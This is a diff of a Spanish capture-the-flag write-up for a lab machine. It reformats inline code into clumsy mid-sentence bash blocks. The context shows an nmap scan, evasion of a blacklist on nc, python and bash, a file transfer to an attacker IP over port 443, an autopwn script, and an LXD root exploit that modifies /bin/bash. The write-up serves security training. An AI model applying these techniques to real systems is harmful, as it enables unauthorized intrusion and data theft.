@@ -60,7 +60,15 @@ Lanzamos un web scan con nmap.
 nmap --script http-enum -p80 10.10.10.27 -oN webScan
 ```
 
-Ya nos detecta un `/admin.php` y un directorio `/uploads/`
+Ya nos detecta un 
+```bash
+ /admin.php 
+```
+ y un directorio 
+```bash
+ /uploads/ 
+```
+
 
 #### Checkear la web del puerto 80 {-}
 
@@ -68,9 +76,21 @@ Abrimos la web y vemos cosas:
 
 - El wappalizer no nos dice nada
 - parece que todavia la web esta en fase de desarollo
-- el directorio `/uploads/` muestra una capacidad de directory listing pero no se ve gran cosa
-- el `/admin.php` nos muestra un login.
-- haciendo un `Ctrl-U` no muestra una contraseña en un comentario ;)
+- el directorio 
+```bash
+ /uploads/ 
+```
+ muestra una capacidad de directory listing pero no se ve gran cosa
+- el 
+```bash
+ /admin.php 
+```
+ nos muestra un login.
+- haciendo un 
+```bash
+ Ctrl-U 
+```
+ no muestra una contraseña en un comentario ;)
 
 
 
@@ -140,7 +160,11 @@ La coneccion se entabla pero el servidor nos expulsa directamente.
 
 ### Creamos una FakeShell {-}
 
-En el directorio exploits creamos un fichero `fakeShell.sh` que contiene
+En el directorio exploits creamos un fichero 
+```bash
+ fakeShell.sh 
+```
+ que contiene
 
 ```bash
 #!/bin/bash
@@ -181,7 +205,15 @@ Encontramos el usuario **xalvas** y ya podemos leer la flag.
 
 La pregunta aqui seria: Porque no nos deja entablar una reverse shell? Porque el sistema nos expulsa cuando lo hacemos?
 
-El comando `ls -l /home/xalvas` nos muestra ficheros. En el fichero `intrusions` vemos lo siguiente
+El comando 
+```bash
+ ls -l /home/xalvas 
+```
+ nos muestra ficheros. En el fichero 
+```bash
+ intrusions 
+```
+ vemos lo siguiente
 
 ```bash
 cat /home/xalvas/intrusions
@@ -189,8 +221,16 @@ cat /home/xalvas/intrusions
 
 
 ![calamity-itrusios](/assets/images/calamity-intrusions.png) 
-Vemos que el comando `nc` esta BlackListeado y que logea el Proccess Kill en este fichero. El problema de esto es que se puede
-que los comandos BlackListeados se controlan con los nombres mismo (no permite `nc, python, bash`). Pero que pasa si copiamos el 
+Vemos que el comando 
+```bash
+ nc 
+```
+ esta BlackListeado y que logea el Proccess Kill en este fichero. El problema de esto es que se puede
+que los comandos BlackListeados se controlan con los nombres mismo (no permite 
+```bash
+ nc, python, bash 
+```
+). Pero que pasa si copiamos el 
 binario bash y que le ponemos un nombre diferente.
 
 1. Nos ponemos en escucha por el puerto 443 en la maquina de atacante
@@ -279,14 +319,22 @@ if __name__ == '__main__':
     shell.interactive()
 ```
 
-Ya lo podemos lanzar con el comando `python3 autopwn.py`
+Ya lo podemos lanzar con el comando 
+```bash
+ python3 autopwn.py 
+```
+
 
 > [ ! ] Notas las explicaciones paso a paso del autopwn se pueden ver en el video al minuto 1:06:21
 
 
 ### Investigamos la maquina {-}
 
-Ya hemos visto una lista de archivos en el repertorio de xalvas y uno es un fichero `.wav`. Nos lo enviamos
+Ya hemos visto una lista de archivos en el repertorio de xalvas y uno es un fichero 
+```bash
+ .wav 
+```
+. Nos lo enviamos
 a nuestra maquina de atacante.
 
 1. En la maquina de atacante
@@ -303,19 +351,47 @@ a nuestra maquina de atacante.
     /dev/shm/transfer 10.10.14.20 443 < recov.wav
     ```
 
-Hay otros ficheros de tipo `.wav`, usando la misma tecnica nos lo enviamos tambien.
-Chequeamos que los ficheros no sa hayan comprometido durante la tansferencia con `md5sum`. Los ficheros `.wav` son ficheros
-de tipo audio y se pueden escuchar con el comando `play recov.wav`
+Hay otros ficheros de tipo 
+```bash
+ .wav 
+```
+, usando la misma tecnica nos lo enviamos tambien.
+Chequeamos que los ficheros no sa hayan comprometido durante la tansferencia con 
+```bash
+ md5sum 
+```
+. Los ficheros 
+```bash
+ .wav 
+```
+ son ficheros
+de tipo audio y se pueden escuchar con el comando 
+```bash
+ play recov.wav 
+```
+
 
 No os asusteis con la musiquita ;)
 
-Escuchando los otros ficheros parece que el fichero `rick.wav` sea la misma cancion y esto es raro. Si le hacemos un `md5sum recov.wav rick.wav`,
+Escuchando los otros ficheros parece que el fichero 
+```bash
+ rick.wav 
+```
+ sea la misma cancion y esto es raro. Si le hacemos un 
+```bash
+ md5sum recov.wav rick.wav 
+```
+,
 vemos que la cancion es la misma pero el **md5sum** no. Quiere decir que la integridad de la data de uno de estos ficheros a sido manipulada.
 
 
 ### Reto de steganografia con Audacity {-}
 
-**Audacity** es una heramienta de audio que se puede instalar con `apt install audacity`. Lo abrimos y cargamos los dos ficheros.
+**Audacity** es una heramienta de audio que se puede instalar con 
+```bash
+ apt install audacity 
+```
+. Lo abrimos y cargamos los dos ficheros.
 Si nos dan 2 audios que parecen se los mismos pero hemos visto con el **md5sum** que no son iguales, Una cosa que se puede hacer es 
 lanzar un audio de manera normal y al mismo tiempo con el segundo audio, invertir la onda del audio. Si hacemos esto y que los dos ficheros
 son ciertamente iguales, no tendriamos que escuchar nada. Lo unico, en este caso que se tendria que escuchar seria las diferencias ente
@@ -379,7 +455,11 @@ Seguimos los pasos del exploit
     ./lxd_privesc.sh -f alpine-v3-14-i686-20210728_2134.tar.gz
     ```
 
-1. vemos un error `error: This must be run as root`. Modificamos el fichero lxd_privesc.sh
+1. vemos un error 
+```bash
+ error: This must be run as root 
+```
+. Modificamos el fichero lxd_privesc.sh
 
     ```bash
     nano lxd_privesc.sh
@@ -391,7 +471,11 @@ Seguimos los pasos del exploit
     # lxc image import $filename --alias alpine && lxd init --auto
     ```
 
-1. Ya estamos root pero en el contenedor. Modificamos la `/bin/bash` de la maquina
+1. Ya estamos root pero en el contenedor. Modificamos la 
+```bash
+ /bin/bash 
+```
+ de la maquina
 
     - en el contenedor
 
